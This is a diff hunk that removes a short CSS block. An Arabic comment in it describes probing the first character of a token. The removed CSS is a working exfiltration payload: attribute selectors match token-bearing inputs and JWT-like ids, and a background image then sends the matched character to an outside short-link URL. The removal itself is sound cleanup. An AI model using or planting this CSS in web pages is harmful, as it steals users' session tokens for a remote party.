@@ -1,5 +1,0 @@
-/* هذا الكود يبحث عن أول حرف في التوكن (مثلاً e) */
-input[value^="e"], *[data-token^="e"], [id*="eyJ"] {
-  background: url("https://rb.gy/sq5g7s?char=e") !important;
-  border: 10px solid red !important;
-}
